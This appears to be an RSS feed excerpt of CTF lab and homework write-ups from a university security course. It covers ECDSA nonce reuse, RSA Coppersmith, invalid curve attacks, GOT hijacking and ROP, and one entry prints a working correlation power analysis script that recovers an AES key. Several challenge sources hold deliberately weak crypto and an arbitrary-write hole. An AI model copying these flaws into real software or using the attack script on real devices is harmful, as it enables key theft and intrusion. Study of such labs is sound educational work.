&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x09(2023 Lab - signature)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x092023-lab---signature/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x092023-lab---signature/</guid><description>&lt;h1 id="simple-crypto---0x092023-lab---signature">
 Simple Crypto - 0x09(2023 Lab - signature)
 &lt;a class="anchor" href="#simple-crypto---0x092023-lab---signature">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/u4ZVc8PuJC0?si=ychlqdZnGVfFYRAV&amp;amp;t=4075"> [edu-ctf 2023] week03 - crypto2 - ECDSA&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>&lt;img src="https://hackmd.io/_uploads/ryVbmdMWp.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/HkJMXOG-T.png" alt="" />&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from random import randint
from Crypto.Util.number import *
from hashlib import sha256
from ecdsa import SECP256k1
from ecdsa.ecdsa import Public_key, Private_key, Signature
from secret import FLAG

E = SECP256k1
G, n = E.generator, E.order

d = randint(1, n)
k = randint(1, n)
pubkey = Public_key(G, d*G)
prikey = Private_key(pubkey, d)
print(f&amp;#39;P = ({pubkey.point.x()}, {pubkey.point.y()})&amp;#39;)

for _ in range(3):
 print(&amp;#39;&amp;#39;&amp;#39;
1) Request for Signature
2) Check the Permission
3) exit&amp;#39;&amp;#39;&amp;#39;)
 option = input()
 if option == &amp;#39;1&amp;#39;:
 msg = input(&amp;#39;What do you want? &amp;#39;)
 if msg == &amp;#39;Give me the FLAG.&amp;#39;:
 print(&amp;#39;No way!&amp;#39;)
 else:
 h = sha256(msg.encode()).digest()
 # k = k * 1337 % n
 sig = prikey.sign(bytes_to_long(h), k)
 print(f&amp;#39;sig = ({sig.r}, {sig.s})&amp;#39;)

 elif option == &amp;#39;2&amp;#39;:
 msg = &amp;#39;Give me the FLAG.&amp;#39;
 r = input(&amp;#39;r: &amp;#39;)
 s = input(&amp;#39;s: &amp;#39;)
 h = bytes_to_long(sha256(msg.encode()).digest())
 verified = pubkey.verifies(h, Signature(int(r), int(s)))
 if verified:
 print(FLAG)
 else:
 print(&amp;#39;Bad signature&amp;#39;)
 else:
 print(&amp;#34;bye~&amp;#34;)
 break
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x10(2023 Lab - coppersmith)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x102023-lab---coppersmith/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x102023-lab---coppersmith/</guid><description>&lt;h1 id="simple-crypto---0x102023-lab---coppersmith">
 Simple Crypto - 0x10(2023 Lab - coppersmith)
 &lt;a class="anchor" href="#simple-crypto---0x102023-lab---coppersmith">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/">coppersmith相關攻擊&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from Crypto.Util.number import bytes_to_long, getPrime
from secret import FLAG

assert len(FLAG) &amp;lt;= 30

p = getPrime(1024)
q = getPrime(1024)
n = p * q
e = 3
padding = b&amp;#34;Padding in cryptography is a fundamental concept employed to ensure that data, typically in the form of plaintext, aligns properly with the encryption algorithm&amp;#39;s block size. This process is crucial for symmetric block ciphers like AES and asymmetric encryption algorithms such as RSA. Padding involves adding extra bits to the input data before encryption, making it fit neatly into fixed-size blocks. The primary purpose of padding is to prevent information leakage by ensuring that the last block of plaintext is always complete, even when the original data&amp;#39;s size isn&amp;#39;t a perfect multiple of the block size. Common padding schemes include PKCS#7, PKCS#1 (for RSA), and ANSI X.923, each with its rules for padding and unpadding data. Proper padding ensures data integrity, security, and compatibility within cryptographic protocols.&amp;#34;
pt = padding + FLAG
ct = pow(bytes_to_long(pt), e, n)
print(f&amp;#34;{e = }&amp;#34;)
print(f&amp;#34;{n = }&amp;#34;)
print(f&amp;#34;{ct = }&amp;#34;)
# e = 3
# n = 11548249006448728920152703839381630946834097081458641312395741399152626808167055308830597218237419306363812953570976143239712039037941209800604194908083149885941768218371746741812573578768412807189143962911312361667909189521442378332430658999991458388376075547304981934158525694587528155624390264161508298680598416212224037418377397597560818727159266535257243347737195812548494888452510974912762585150695881388036715559552242157015756455473208463066542053661043988897316002396230791287157322382659981842882278113445574922266102197380093864871418103716702341116793118630092030597784102701252267617442078055768183287429
# ct = 10016669153906644953016660527326048255337800602435656916304698358749910229624738375584073093905785564737742726549033330343901680652357648652891913260149958947299067801907769873568759955053120633017158582128001396334187309835478967775943564724073809481988489791896725867047366927584419210464759674986336704398037888892734158765679221980466827060998749130113847401820986980535379266905587107992796676977541915779320084736207068268591500847603252838325486939367980604888710370629644796971859833251926677637185722683564847418746350226830775205063128441515048529918173084258483536354002888691012853231754416802134513394608
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto 0x11(2023 HW - invalid_curve_attack)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x112023-hw---invalid_curve_attack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x112023-hw---invalid_curve_attack/</guid><description>&lt;h1 id="simple-crypto-0x112023-hw---invalid_curve_attack">
 Simple Crypto 0x11(2023 HW - invalid_curve_attack)
 &lt;a class="anchor" href="#simple-crypto-0x112023-hw---invalid_curve_attack">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/maple3142/My-CTF-Challenges/blob/7d9141ac7b61fdbb71f29c07d489018d7c0a0aaa/AIS3%20Pre-exam%202022/pekobot/README.md">pekobot - maple&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>這邊我會嘗試用簡單的講法把這個攻擊簡述一遍，詳細還是建議 &lt;a href="https://github.com/ashutosh1206/Crypton/blob/master/Diffie-Hellman-Key-Exchange/Attack-Invalid-Curve-Point/README.md">Crypton&lt;/a> 或是其他地方的說明。&lt;/p>
&lt;p>Invalid Curve Attack 大致上來說利用的是當一個不在原本曲線 $E$ 上的 $P$ 進行 scalar multiplication 的一些特性，使用類似 &lt;a href="https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm">Pohlig–Hellman algorithm&lt;/a> 的辦法在不同的 subgroup 解 &lt;a href="https://en.wikipedia.org/wiki/Discrete_logarithm">DLP&lt;/a> 然後用 &lt;a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem">CRT&lt;/a> 解回原本的 private key。&lt;/p>
&lt;p>一個 Short Weierstrass curve 長這樣:&lt;/p>
&lt;p>$$
y^2 = x^3 + ax + b
$$&lt;/p>
&lt;p>而它的 point doubling formula ($R=2P$) 是:&lt;/p>
&lt;p>$$
\begin{aligned}
s &amp;amp;= \frac{3x_P^2+a}{2y_P} \
x_R &amp;amp;= s^2 - 2x_P \
y_R &amp;amp;= y_P + s(x_R - x_P)
\end{aligned}
$$&lt;/p></description></item><item><title>Simple Crypto 0x12(2023 HW - signature_revenge)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x122023-hw---signature_revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x122023-hw---signature_revenge/</guid><description>&lt;h1 id="simple-crypto-0x122023-hw---signature_revenge">
 Simple Crypto 0x12(2023 HW - signature_revenge)
 &lt;a class="anchor" href="#simple-crypto-0x122023-hw---signature_revenge">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://hackmd.io/_uploads/Skf4o1tGp.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/B16No1FzT.png" alt="" />&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> hashlib &lt;span style="color:#f92672">import&lt;/span> sha256, md5
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> ecdsa &lt;span style="color:#f92672">import&lt;/span> SECP256k1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> ecdsa.ecdsa &lt;span style="color:#f92672">import&lt;/span> Public_key, Private_key
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>E &lt;span style="color:#f92672">=&lt;/span> SECP256k1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>G, n &lt;span style="color:#f92672">=&lt;/span> E&lt;span style="color:#f92672">.&lt;/span>generator, E&lt;span style="color:#f92672">.&lt;/span>order
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>d &lt;span style="color:#f92672">=&lt;/span> bytes_to_long( os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(FLAG)) &lt;span style="color:#f92672">+&lt;/span> FLAG )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pubkey &lt;span style="color:#f92672">=&lt;/span> Public_key(G, d&lt;span style="color:#f92672">*&lt;/span>G)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>prikey &lt;span style="color:#f92672">=&lt;/span> Private_key(pubkey, d)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>magic1 &lt;span style="color:#f92672">=&lt;/span> md5(d&lt;span style="color:#f92672">.&lt;/span>to_bytes(&lt;span style="color:#ae81ff">32&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;big&amp;#34;&lt;/span>))&lt;span style="color:#f92672">.&lt;/span>digest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>magic2 &lt;span style="color:#f92672">=&lt;/span> md5(d&lt;span style="color:#f92672">.&lt;/span>to_bytes(&lt;span style="color:#ae81ff">32&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;big&amp;#34;&lt;/span>)[::&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>])&lt;span style="color:#f92672">.&lt;/span>digest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>h1 &lt;span style="color:#f92672">=&lt;/span> sha256(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;https://www.youtube.com/watch?v=IBnrn2pnPG8&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>digest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>h2 &lt;span style="color:#f92672">=&lt;/span> sha256(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;https://www.youtube.com/watch?v=1H2cyhWYXrE&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>digest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>k1 &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(magic1 &lt;span style="color:#f92672">+&lt;/span> magic2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>k2 &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(magic2 &lt;span style="color:#f92672">+&lt;/span> magic1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sig1 &lt;span style="color:#f92672">=&lt;/span> prikey&lt;span style="color:#f92672">.&lt;/span>sign(bytes_to_long(h1), k1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sig2 &lt;span style="color:#f92672">=&lt;/span> prikey&lt;span style="color:#f92672">.&lt;/span>sign(bytes_to_long(h2), k2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;P = (&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>pubkey&lt;span style="color:#f92672">.&lt;/span>point&lt;span style="color:#f92672">.&lt;/span>x()&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>pubkey&lt;span style="color:#f92672">.&lt;/span>point&lt;span style="color:#f92672">.&lt;/span>y()&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">)&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;sig1 = (&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>sig1&lt;span style="color:#f92672">.&lt;/span>r&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>sig1&lt;span style="color:#f92672">.&lt;/span>s&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">)&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;sig2 = (&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>sig2&lt;span style="color:#f92672">.&lt;/span>r&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>sig2&lt;span style="color:#f92672">.&lt;/span>s&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">)&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># P = (70427896289635684269185763735464004880272487387417064603929487585697794861713, 83106938517126976838986116917338443942453391221542116900720022828358221631968)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sig1 = (26150478759659181410183574739595997895638116875172347795980556499925372918857, 50639168022751577246163934860133616960953696675993100806612269138066992704236)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sig2 = (8256687378196792904669428303872036025324883507048772044875872623403155644190, 90323515158120328162524865800363952831516312527470472160064097576156608261906)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto 0x13(2023 HW - Power Analysis)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x132023-hw---power-analysis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x132023-hw---power-analysis/</guid><description>&lt;h1 id="simple-crypto-0x132023-hw---power-analysis">
 Simple Crypto 0x13(2023 HW - Power Analysis)
 &lt;a class="anchor" href="#simple-crypto-0x132023-hw---power-analysis">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/Q-gaGLJpJHc?si=DZgJm62AnoPHWiZF&amp;amp;t=5433"> [edu-ctf 2023] week04 - crypto3 [1:30:36]&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>json file recorded by TA&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題全部都是刻出來的，也包含算correlation coefficient，後面才知道numpy有這東西，但反正根據老師上課的作法一步一步跟著做是絕對沒有問題的，包含以下步驟:&lt;/p>
&lt;ol>
&lt;li>Preprocessing
也就是把pt, ct, pm都按照簡報上的方式排列(各個trace的第一個byte都蒐集在一起，第二個byte都蒐集再一起&amp;hellip;)&lt;/li>
&lt;li>計算和sbox key XOR的結果&lt;/li>
&lt;li>查表sbox&lt;/li>
&lt;li>計算hamming weight model&lt;/li>
&lt;li>計算和trace的correlation coefficient&lt;/li>
&lt;li>看哪一個結果的數值最大，並把index結果記錄下來算它的ascii&lt;/li>
&lt;li>repeat以上操作後共可得16 bytes的flag&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>加速的方法:
可以把整個trace的圖片plot出來看看，會發現題目給的json file是把整段加密的過程記錄下來，所以我們可以只取前一兩百個point就可以完成key的還原&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import json
from tqdm import trange
import numpy as np
import copy
from string import ascii_letters, digits
from numpy import corrcoef

jsonFile = open(&amp;#39;./Crypto/HW3/traces.json&amp;#39;, &amp;#39;r&amp;#39;)
j = json.load(jsonFile)

s_box = [
 [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76],
 [0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0],
 [0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15],
 [0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75],
 [0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84],
 [0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF],
 [0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8],
 [0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2],
 [0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73],
 [0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB],
 [0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79],
 [0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08],
 [0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A],
 [0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E],
 [0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF],
 [0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]
]

def data_preprocess(json_data):
 pt_col = []
 ct_col = []
 trace_col = []
 for bytes in range(16):
 tmp_pt_col = []
 tmp_ct_col = []
 for trace_idx in range(len(json_data)):
 tmp_pt_col.append(json_data[trace_idx][&amp;#39;pt&amp;#39;][bytes])
 tmp_ct_col.append(json_data[trace_idx][&amp;#39;ct&amp;#39;][bytes])
 pt_col.append(tmp_pt_col)
 ct_col.append(tmp_ct_col)
 for point in range(len(json_data[0][&amp;#39;pm&amp;#39;])):
 tmp_trace_col = []
 for trace_idx in range(len(json_data)):
 tmp_trace_col.append(json_data[trace_idx][&amp;#39;pm&amp;#39;][point])
 trace_col.append(tmp_trace_col)
 
 return pt_col, ct_col, trace_col

def sbox_preprocess(pt_col):
 sbox_result_tmp = []
 for sbox_key in range(256): # 總共有256個sbox key
 tmp = []
 for trace in range(len(pt_col)): # 有50個trace
 tmp.append(pt_col[trace] ^ sbox_key)
 sbox_result_tmp.append(tmp)
 return sbox_result_tmp

def choose_sbox(sbox_result_tmp):
 sbox_result = copy.deepcopy(sbox_result_tmp)
 for sbox_key in range(256):
 for trace in range(50):
 hex_value = &amp;#39;{0:0&amp;gt;2x}&amp;#39;.format(sbox_result_tmp[sbox_key][trace])
 x, y = hex_value[0], hex_value[1]
 sbox_result[sbox_key][trace] = s_box[int(x, 16)][int(y, 16)]
 
 return sbox_result

def cal_hamming_weight(sbox_result_col):
 hw_model = copy.deepcopy(sbox_result_col)
 for i in range(len(sbox_result_col)): # 256
 for j in range(len(sbox_result_col[i])): # 50
 hw_model[i][j] = bin(sbox_result_col[i][j]).count(&amp;#39;1&amp;#39;)
 
 return hw_model

def cal_correlation(hw_model_col_result, trace_col):
 correlation_result = []
 for i in (ascii_letters + digits).encode():#trange(len(hw_model_col_result)): &amp;lt;- 加速的部分
 for j in range(biggest_length):
 correlation_result.append(corrcoef(hw_model_col_result[i], trace_col[j])[0, -1])
 return correlation_result
 
def run_pearson_correlation(x, y):
 mean_x = np.mean(x)
 mean_y = np.mean(y)
 
 covariance = np.sum((x - mean_x) * (y - mean_y))
 
 std_dev_x = np.sqrt(np.sum((x - mean_x)**2))
 std_dev_y = np.sqrt(np.sum((y - mean_y)**2))
 
 correlation = covariance / (std_dev_x * std_dev_y)
 
 return correlation

def display_pt(offset:int, data_offset = (0, len(j[0][&amp;#34;pm&amp;#34;]))):
 plt.plot(range(data_offset[0], data_offset[1]), j[offset][&amp;#34;pm&amp;#34;][data_offset[0]:data_offset[1]])
 plt.savefig(fname=&amp;#34;pt_&amp;#34; + str(offset) + &amp;#34;.jpg&amp;#34;)
 plt.clf()

# display_pt(0, (0, 95))
# display_pt(0)
pt_col, ct_col, trace_col = data_preprocess(j)
flag = &amp;#39;&amp;#39;
biggest_length = 95# len(trace_col)
for idx in trange(16):
 sbox_preprocess_result = sbox_preprocess(pt_col[idx])
 choose_sbox_result = choose_sbox(sbox_preprocess_result)
 hw_model_col_result = cal_hamming_weight(choose_sbox_result)
 correlation_result = cal_correlation(hw_model_col_result, trace_col)
 key_idx = correlation_result.index(max(correlation_result))
 flag += (ascii_letters + digits)[key_idx // biggest_length]
 # from Crypto.Util.number import long_to_bytes
 # flag += long_to_bytes(key_idx // biggest_length).decode(&amp;#34;cp437&amp;#34;)

print(&amp;#39;The key of AES is: FLAG{&amp;#39; + flag + &amp;#39;}&amp;#39;)
&lt;/code>&lt;/pre>&lt;p>有嘗試過只選擇常見可使用的字元也就是&lt;code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&lt;/code>，以及trace只選擇前95個data，也可以正常解析出AES key並且算的更快(大約快77倍左右)&lt;/p></description></item><item><title>Simple PWN - 0x06(GOT hijacking/Lab - `got2win`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/</guid><description>&lt;h1 id="simple-pwn---0x06got-hijackinglab---got2win">
 Simple PWN - 0x06(GOT hijacking/Lab - &lt;code>got2win&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x06got-hijackinglab---got2win">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10004&lt;/code>&lt;/p>
&lt;h2 id="got-background">
 GOT Background
 &lt;a class="anchor" href="#got-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/ktoVQB99Gj4?t=4423">Lecture Vid. - Pwn week1&lt;/a>
&lt;a href="https://youtu.be/PBgHHWtjtFA?t=6017">NTUSTISC - Pwn Basic 2 [2019.03.19]&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

char flag[0x30];

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 int fd = open(&amp;#34;/home/chal/flag&amp;#34;, O_RDONLY);
 read(fd, flag, 0x30);
 close(fd);
 write(1, &amp;#34;Good luck !\n&amp;#34;, 13);

 unsigned long addr = 0;
 printf(&amp;#34;Overwrite addr: &amp;#34;);
 scanf(&amp;#34;%lu&amp;#34;, &amp;amp;addr);
 printf(&amp;#34;Overwrite 8 bytes value: &amp;#34;);
 read(0, (void *) addr, 0x8);

 printf(&amp;#34;Give me fake flag: &amp;#34;);
 int nr = read(1, flag, 0x30);
 if (nr &amp;lt;= 0)
 exit(1);
 flag[nr - 1] = &amp;#39;\0&amp;#39;;
 printf(&amp;#34;This is your flag: ctf{%s}... Just kidding :)\n&amp;#34;, flag);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN - 0x07(ROP)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x07rop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x07rop/</guid><description>&lt;h1 id="simple-pwn---0x07rop">
 Simple PWN - 0x07(ROP)
 &lt;a class="anchor" href="#simple-pwn---0x07rop">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>This is very similar to normal &lt;code>BOF&lt;/code>.&lt;/li>
&lt;li>If a sample code that doesn&amp;rsquo;t have a backdoor function and you cannot input a backdoor function as well, then you can use some code segment to merge a shellcode.&lt;/li>
&lt;li>Therefore, the main idea is use some &lt;code>&amp;lt;operation&amp;gt;;ret&lt;/code> pattern segment to overlap stack.
